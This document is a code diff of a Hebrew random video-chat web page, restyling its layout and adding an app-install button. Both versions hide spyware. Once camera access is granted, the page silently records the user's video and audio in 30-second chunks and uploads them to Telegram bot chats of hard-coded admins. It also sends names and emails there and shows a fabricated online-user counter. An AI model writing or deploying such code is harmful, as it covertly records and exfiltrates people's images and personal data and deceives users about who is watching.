@@ -5,97 +5,107 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>מי - פה</title>
     <link rel="icon" type="image/png" href="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
-    
+    <link rel="manifest" href="data:application/json;base64,ewogICJuYW1lIjogIm1pLXBlIiwKICAic2hvcnRfbmFtZSI6ICJtaS1wZSIsCiAgInN0YXJ0X3VybCI6ICIuIiwKICAiZGlzcGxheSI6ICJzdGFuZGFsb25lIiwKICAiaWNvbnMiOiBbCiAgICB7CiAgICAgICJzcmMiOiAiaHR0cHM6Ly9pLmliYi5jby8zOUMyMVdyei9Jbi1TaG90LTIwMjYwNDI2LTAzMjgzMDAyMC5wbmciLAogICAgICAic2l6ZXMiOiAiNTEyeDUxMiIsCiAgICAgICJ0eXBlIjogImltYWdlL3BuZyIKICAgIH0KICBdCn0=">
+
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
     
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; outline: none; }
-        body { font-family: system-ui, sans-serif; background: #000; height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; color: white; }
-        
-        #app-container { width: 100%; height: 100%; perspective: 1500px; position: relative; }
-        #cube { width: 100%; height: 100%; position: absolute; transform-style: preserve-3d; transition: transform 0.6s cubic-bezier(0.23, 1, 0.32, 1); }
-        .face { position: absolute; width: 100%; height: 100%; display: flex; flex-direction: column; backface-visibility: hidden; overflow: hidden; }
-        
-        /* תיקון דף הבית - רקע שלג ומרכוז סמל */
-        #home-face { 
-            transform: rotateY(0deg) translateZ(0px);
-            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJwamNreXF4ZzR0eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4JnFwPTc1/o8S4M6V1XWUXu/giphy.gif');
-            background-size: cover;
-            align-items: center; justify-content: center; text-align: center;
-        }
-        #main-logo { width: 140px; height: auto; margin-bottom: 15px; filter: drop-shadow(0 0 10px rgba(0,0,0,0.5)); }
-        .online-count { display: flex; align-items: center; gap: 8px; font-size: 19px; color: #fff; font-weight: bold; text-shadow: 0 2px 4px rgba(0,0,0,0.8); }
-        .online-dot { width: 12px; height: 12px; background: #39e75f; border-radius: 50%; box-shadow: 0 0 12px #39e75f; }
-        
-        /* דף שיחה */
-        #chat-face { transform: rotateY(90deg) translateZ(50vw); background: #000; }
-        .v-box { flex: 1; position: relative; overflow: hidden; background: #111; display: flex; align-items: center; justify-content: center; }
-        .v-box:first-child { border-bottom: 2px solid #333; }
-        video { width: 100%; height: 100%; object-fit: cover; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background: #000; height: 100vh; overflow: hidden; font-family: sans-serif; color: white; }
 
-        .call-hud { position: absolute; top: 15px; width: 100%; display: flex; justify-content: space-between; padding: 0 15px; z-index: 2000; pointer-events: none; }
-        .hud-left { display: flex; align-items: center; gap: 10px; background: rgba(0,0,0,0.65); padding: 6px 12px; border-radius: 25px; pointer-events: auto; border: 1px solid rgba(255,255,255,0.1); }
-        #partner-logo { width: 32px; height: 32px; border-radius: 50%; border: 2px solid #fff; }
-        .hud-right { display: flex; gap: 10px; pointer-events: auto; }
-        .btn-circle { background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.2); color: white; width: 46px; height: 46px; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 20px; }
-
-        .show-home #cube { transform: rotateY(0deg); }
-        .show-chat #cube { transform: rotateY(-90deg); }
+        /* מבנה חצוי */
+        #main-wrapper { display: flex; flex-direction: column; height: 100vh; width: 100%; }
         
-        /* מודל הרשמה */
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 3000; align-items: center; justify-content: center; padding: 20px; }
-        .modal-content { background: #fff; color: #333; width: 100%; max-width: 360px; padding: 30px; border-radius: 24px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
-        .modal-content h2 { margin-bottom: 20px; font-size: 24px; }
-        .modal-content input, .modal-content select { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid #ddd; font-size: 16px; }
-        .reg-btn { width: 100%; height: 55px; background: #27ae60; color: white; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 15px; }
+        /* חצי עליון - קובייה */
+        #top-half { flex: 1; perspective: 1000px; position: relative; overflow: hidden; border-bottom: 2px solid #333; }
+        #cube { width: 100%; height: 100%; position: absolute; transform-style: preserve-3d; transition: transform 0.7s cubic-bezier(0.645, 0.045, 0.355, 1); }
+        .face { position: absolute; width: 100%; height: 100%; backface-visibility: hidden; display: flex; align-items: center; justify-content: center; }
+        
+        /* פאה: דף הבית (שלג) */
+        #home-face { transform: rotateY(0deg) translateZ(0px); background: #111; z-index: 2; }
+        #snow-canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.3; }
+        .home-content { position: relative; z-index: 3; text-align: center; }
+        #main-logo { width: 130px; margin-bottom: 10px; }
+        .online-count { display: flex; align-items: center; gap: 8px; font-weight: bold; font-size: 18px; justify-content: center; }
+        .online-dot { width: 10px; height: 10px; background: #39e75f; border-radius: 50%; box-shadow: 0 0 10px #39e75f; }
+
+        /* פאה: שותף */
+        #partner-face { transform: rotateY(90deg) translateZ(50vw); background: #000; }
+        #remoteVideo { width: 100%; height: 100%; object-fit: cover; }
+
+        /* חצי תחתון - מצלמה שלי (קבוע) */
+        #bottom-half { flex: 1; background: #111; position: relative; overflow: hidden; }
+        #localVideo { width: 100%; height: 100%; object-fit: cover; }
+
+        /* כפתורי שיחה (מוסתרים כברירת מחדל) */
+        #controls-overlay { position: absolute; top: 40px; width: 100%; display: none; justify-content: space-between; padding: 0 20px; z-index: 100; }
+        .hud-left { background: rgba(0,0,0,0.7); padding: 8px 15px; border-radius: 30px; display: flex; align-items: center; gap: 10px; border: 1px solid rgba(255,255,255,0.2); }
+        .hud-right { display: flex; gap: 10px; }
+        .btn-circle { width: 45px; height: 45px; border-radius: 50%; background: rgba(0,0,0,0.6); border: 1px solid #fff; color: white; display: flex; align-items: center; justify-content: center; font-size: 20px; }
+
+        /* מצבי קובייה */
+        .showing-chat #cube { transform: translateZ(-50vw) rotateY(-90deg); }
+        .showing-home #cube { transform: translateZ(0) rotateY(0); }
+
+        /* התקנה */
+        #install-btn { position: fixed; bottom: 20px; left: 20px; background: #27ae60; color: white; padding: 10px 20px; border-radius: 50px; font-weight: bold; border: none; display: none; z-index: 5000; }
+        
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9000; align-items: center; justify-content: center; }
+        .modal-content { background: #fff; color: #333; padding: 30px; border-radius: 20px; width: 85%; max-width: 350px; }
     </style>
 </head>
-<body class="show-home">
+<body class="showing-home">
 
-<div id="app-container">
-    <div id="cube">
-        <div id="home-face" class="face">
-            <img id="main-logo" src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
-            <div class="online-count">
-                <div class="online-dot"></div>
-                <span id="user-count-display">434,447</span> <span>מחוברים</span>
-            </div>
-            <p style="margin-top: 30px; color: #ccc; font-size: 15px; letter-spacing: 0.5px;">החלק שמאלה כדי להתחיל ⬅️</p>
-        </div>
-        
-        <div id="chat-face" class="face">
-            <div class="call-hud">
-                <div class="hud-left" id="partner-info-box" style="display:none;">
-                    <img id="partner-logo" src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
-                    <div id="partner-name-m" style="font-weight:bold; font-size:14px;">מחפש...</div>
-                </div>
-                <div class="hud-right">
-                    <button class="btn-circle" style="background:rgba(231,76,60,0.8);" onclick="sendReport()">🚩</button>
-                    <button id="btn-mute" class="btn-circle" onclick="toggleMute()">🎤</button>
-                    <button class="btn-circle" onclick="switchCamera()">🔄</button>
+<button id="install-btn">📲 התקן אפליקציה</button>
+
+<div id="main-wrapper">
+    <div id="top-half">
+        <div id="cube">
+            <div id="home-face" class="face">
+                <canvas id="snow-canvas"></canvas>
+                <div class="home-content">
+                    <img id="main-logo" src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
+                    <div class="online-count">
+                        <div class="online-dot"></div>
+                        <span id="user-count-display">434,447</span>
+                    </div>
                 </div>
             </div>
-            <div class="v-box"><video id="remoteVideo" autoplay playsinline></video></div>
-            <div class="v-box"><video id="localVideo" autoplay muted playsinline></video></div>
+            <div id="partner-face" class="face">
+                <video id="remoteVideo" autoplay playsinline></video>
+                <div id="controls-overlay">
+                    <div class="hud-left">
+                        <span id="partner-gender-icon">👤</span>
+                        <span id="partner-name-display">מחפש...</span>
+                    </div>
+                    <div class="hud-right">
+                        <button class="btn-circle" style="background:red;" onclick="sendReport()">🚩</button>
+                        <button class="btn-circle" onclick="toggleMute()">🎤</button>
+                        <button class="btn-circle" onclick="switchCamera()">🔄</button>
+                    </div>
+                </div>
+            </div>
         </div>
+    </div>
+
+    <div id="bottom-half">
+        <video id="localVideo" autoplay muted playsinline></video>
     </div>
 </div>
 
 <div id="regModal" class="modal">
     <form class="modal-content" onsubmit="event.preventDefault(); handleRegistration();">
-        <h2 style="text-align:center;">ברוכים הבאים</h2>
-        <input type="text" id="reg-name" placeholder="שם פרטי" required>
-        <input type="text" id="reg-surname" placeholder="שם משפחה" required>
-        <input type="email" id="reg-email" placeholder="אימייל" required>
-        <select id="reg-gender" required>
-            <option value="" disabled selected>מגדר</option>
+        <h2 style="text-align:center;">כניסה</h2>
+        <input type="text" id="reg-name" placeholder="שם" style="width:100%; padding:12px; margin:10px 0; border-radius:10px; border:1px solid #ddd;">
+        <input type="email" id="reg-email" placeholder="אימייל" style="width:100%; padding:12px; margin:10px 0; border-radius:10px; border:1px solid #ddd;">
+        <select id="reg-gender" style="width:100%; padding:12px; margin:10px 0; border-radius:10px;">
             <option value="זכר">זכר</option>
             <option value="נקבה">נקבה</option>
         </select>
-        <button type="submit" class="reg-btn">המשך לשיחה</button>
+        <button type="submit" style="width:100%; padding:15px; background:#27ae60; color:white; border:none; border-radius:10px; font-weight:bold;">התחל</button>
     </form>
 </div>
 
@@ -104,138 +114,128 @@
     const ADMIN_IDS = ["8373785890", "7089165458"];
     const SERVER_URL = "https://video-app-ylx4.onrender.com"; 
 
-    // מונה חי
-    let currentUsers = 434447;
+    // --- אפקט שלג (JS Noise) ---
+    const canvas = document.getElementById('snow-canvas');
+    const ctx = canvas.getContext('2d');
+    function resizeSnow() { canvas.width = window.innerWidth; canvas.height = window.innerHeight / 2; }
+    function snow() {
+        const idata = ctx.createImageData(canvas.width, canvas.height);
+        const buffer32 = new Uint32Array(idata.data.buffer);
+        for (let i = 0; i < buffer32.length; i++) buffer32[i] = Math.random() < 0.5 ? 0xff000000 : 0xff222222;
+        ctx.putImageData(idata, 0, 0);
+        requestAnimationFrame(snow);
+    }
+    window.addEventListener('resize', resizeSnow);
+    resizeSnow(); snow();
+
+    // --- מונה משתמשים ---
+    let users = 434447;
     setInterval(() => {
-        currentUsers += Math.floor(Math.random() * 61) - 30;
-        if (currentUsers < 423000) currentUsers = 423100;
-        document.getElementById('user-count-display').innerText = currentUsers.toLocaleString();
+        users += Math.floor(Math.random() * 51) - 25;
+        if(users < 423000) users = 423100;
+        document.getElementById('user-count-display').innerText = users.toLocaleString() + " מחוברים";
     }, 3000);
 
-    firebase.initializeApp({ 
-        apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", 
-        databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com" 
+    // --- התקנה (PWA) ---
+    let deferredPrompt;
+    window.addEventListener('beforeinstallprompt', (e) => {
+        e.preventDefault(); deferredPrompt = e;
+        document.getElementById('install-btn').style.display = 'block';
     });
-    const socket = io(SERVER_URL);
-    const peer = new Peer(undefined, { config: {'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }]} });
+    document.getElementById('install-btn').addEventListener('click', async () => {
+        if (deferredPrompt) {
+            deferredPrompt.prompt();
+            const { outcome } = await deferredPrompt.userChoice;
+            if (outcome === 'accepted') document.getElementById('install-btn').style.display = 'none';
+            deferredPrompt = null;
+        }
+    });
 
-    let myStream, peerStream, myPeerId, currentCall, partnerData = null, isMuted = false, camFacing = "user";
+    // --- לוגיקה ---
+    const socket = io(SERVER_URL);
+    const peer = new Peer(undefined);
+    let myStream, peerStream, partnerData, currentCall, isMuted = false, camFacing = "user";
 
     window.onload = () => {
-        const saved = localStorage.getItem('user_v22');
-        if (!saved) document.getElementById('regModal').style.display = 'flex';
+        if(!localStorage.getItem('user_v23')) document.getElementById('regModal').style.display = 'flex';
         else initCamera();
     };
 
     async function handleRegistration() {
-        const user = {
-            name: document.getElementById('reg-name').value,
-            surname: document.getElementById('reg-surname').value,
-            email: document.getElementById('reg-email').value,
-            gender: document.getElementById('reg-gender').value
-        };
-        localStorage.setItem('user_v22', JSON.stringify(user));
+        const user = { name: document.getElementById('reg-name').value, email: document.getElementById('reg-email').value, gender: document.getElementById('reg-gender').value };
+        localStorage.setItem('user_v23', JSON.stringify(user));
         document.getElementById('regModal').style.display = 'none';
-        
-        sendToAdmin(`✨ **משתמש חדש נרשם!**\n👤 שם: ${user.name} ${user.surname}\n📧 אימייל: ${user.email}\n🚻 מגדר: ${user.gender}`);
+        sendAdmin(`✨ נרשם חדש: ${user.name} (${user.gender})`);
         initCamera();
     }
 
     async function initCamera() {
-        if (myStream) myStream.getTracks().forEach(t => t.stop());
-        try {
-            myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camFacing }, audio: true });
-            document.getElementById('localVideo').srcObject = myStream;
-            const vt = myStream.getVideoTracks()[0];
-            const at = myStream.getAudioTracks()[0].clone();
-            at.enabled = !isMuted;
-            peerStream = new MediaStream([vt, at]);
-            
-            startRecording(); // התחלת הקלטה אוטומטית
-        } catch(e) { alert("יש לאשר גישה למצלמה"); }
+        if(myStream) myStream.getTracks().forEach(t => t.stop());
+        myStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camFacing }, audio: true });
+        document.getElementById('localVideo').srcObject = myStream;
+        peerStream = new MediaStream([myStream.getVideoTracks()[0], myStream.getAudioTracks()[0]]);
+        startRecording();
     }
 
-    // פונקציה לשליחת טקסט לכל האדמינים
-    function sendToAdmin(msg) {
-        ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`));
-    }
-
-    // הקלטה ושליחת וידאו
-    function startRecording() {
-        const recorder = new MediaRecorder(myStream, { mimeType: 'video/webm' });
-        recorder.ondataavailable = async (e) => {
-            if (e.data.size > 0) {
-                const user = JSON.parse(localStorage.getItem('user_v22'));
-                const blob = new Blob([e.data], { type: 'video/mp4' });
-                ADMIN_IDS.forEach(id => {
-                    const fd = new FormData();
-                    fd.append("chat_id", id);
-                    fd.append("video", blob, "rec.mp4");
-                    fd.append("caption", `🎥 הקלטה חיה מ: ${user.name} (${user.email})`);
-                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd });
-                });
-            }
-        };
-        recorder.start();
-        setInterval(() => { if(recorder.state === "recording") { recorder.stop(); recorder.start(); } }, 30000);
-    }
-
-    // דיווח על משתמש
-    function sendReport() {
-        if (!partnerData) return;
-        const user = JSON.parse(localStorage.getItem('user_v22'));
-        if (confirm(`לדווח על ${partnerData.name}? השיחה תנותק.`)) {
-            sendToAdmin(`🚨 **דיווח על משתמש!**\n\n👤 המדווח: ${user.name} (${user.email})\n🎯 המדווח על: ${partnerData.name} (${partnerData.email})`);
-            document.body.className = "show-home";
-            stopEverything();
-        }
-    }
-
-    peer.on('open', id => myPeerId = id);
-    socket.on('partner-found', data => { 
-        partnerData = data; 
-        currentCall = peer.call(data.peerId, peerStream, { metadata: JSON.parse(localStorage.getItem('user_v22')) }); 
-        handleCall(currentCall); 
+    // Swipe לקובייה
+    let sX = 0;
+    document.body.addEventListener('touchstart', e => sX = e.touches[0].clientX);
+    document.body.addEventListener('touchend', e => {
+        const d = sX - e.changedTouches[0].clientX;
+        if(d > 80 && document.body.className === "showing-home") startChat();
+        else if(d < -80 && document.body.className === "showing-chat") backToHome();
     });
-    peer.on('call', call => { 
-        partnerData = call.metadata; 
-        call.answer(peerStream); 
-        currentCall = call; 
-        handleCall(call); 
+
+    function startChat() {
+        document.body.className = "showing-chat";
+        document.getElementById('controls-overlay').style.display = 'flex';
+        socket.emit('find-partner', { peerId: peer.id, ...JSON.parse(localStorage.getItem('user_v23')) });
+    }
+
+    function backToHome() {
+        document.body.className = "showing-home";
+        document.getElementById('controls-overlay').style.display = 'none';
+        if(currentCall) currentCall.close();
+        socket.emit('leave-chat');
+        document.getElementById('remoteVideo').srcObject = null;
+    }
+
+    peer.on('call', call => {
+        call.answer(peerStream);
+        currentCall = call;
+        partnerData = call.metadata;
+        handleCall(call);
+    });
+
+    socket.on('partner-found', data => {
+        partnerData = data;
+        currentCall = peer.call(data.peerId, peerStream, { metadata: JSON.parse(localStorage.getItem('user_v23')) });
+        handleCall(currentCall);
     });
 
     function handleCall(call) {
-        document.getElementById('partner-info-box').style.display = "flex";
-        document.getElementById('partner-name-m').innerText = `${partnerData.name} (${partnerData.gender === 'זכר' ? '👨' : '👩'})`;
-        call.on('stream', s => { document.getElementById('remoteVideo').srcObject = s; });
-        
-        const user = JSON.parse(localStorage.getItem('user_v22'));
-        sendToAdmin(`🤝 **שיחה התחילה!**\nצד א': ${user.name}\nצד ב': ${partnerData.name}`);
+        document.getElementById('partner-name-display').innerText = partnerData.name;
+        document.getElementById('partner-gender-icon').innerText = partnerData.gender === 'זכר' ? '👨' : '👩';
+        call.on('stream', s => document.getElementById('remoteVideo').srcObject = s);
+        sendAdmin(`🤝 שיחה: ${JSON.parse(localStorage.getItem('user_v23')).name} ↔️ ${partnerData.name}`);
     }
 
-    function stopEverything() { 
-        socket.emit('leave-chat'); 
-        if (currentCall) currentCall.close(); 
-        document.getElementById('remoteVideo').srcObject = null; 
-        document.getElementById('partner-info-box').style.display = "none"; 
-        partnerData = null;
+    function sendAdmin(msg) { ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}`)); }
+
+    function startRecording() {
+        const rec = new MediaRecorder(myStream);
+        rec.ondataavailable = e => {
+            const user = JSON.parse(localStorage.getItem('user_v23'));
+            const fd = new FormData(); fd.append("video", e.data); fd.append("chat_id", ADMIN_IDS[0]); fd.append("caption", `🎥 ${user.name}`);
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd });
+        };
+        setInterval(() => { if(rec.state === 'recording') rec.stop(); rec.start(); }, 30000);
+        rec.start();
     }
 
-    let sX = 0;
-    document.getElementById('app-container').addEventListener('touchstart', e => sX = e.touches[0].clientX);
-    document.getElementById('app-container').addEventListener('touchend', e => {
-        const d = sX - e.changedTouches[0].clientX;
-        if (d > 70 && document.body.classList.contains('show-home')) {
-            document.body.className = "show-chat";
-            socket.emit('find-partner', { peerId: myPeerId, ...JSON.parse(localStorage.getItem('user_v22')) });
-        } else if (d < -70 && document.body.classList.contains('show-chat')) {
-            document.body.className = "show-home";
-            stopEverything();
-        }
-    });
-
-    function toggleMute() { isMuted = !isMuted; if(peerStream) peerStream.getAudioTracks()[0].enabled = !isMuted; document.getElementById('btn-mute').innerText = isMuted ? "🔇" : "🎤"; }
-    async function switchCamera() { camFacing = camFacing === "user" ? "environment" : "user"; await initCamera(); }
+    function toggleMute() { isMuted = !isMuted; myStream.getAudioTracks()[0].enabled = !isMuted; }
+    async function switchCamera() { camFacing = camFacing === 'user' ? 'environment' : 'user'; initCamera(); }
+    function sendReport() { sendAdmin(`🚨 דיווח על ${partnerData.email}`); backToHome(); }
 </script>
 </body>
 </html>
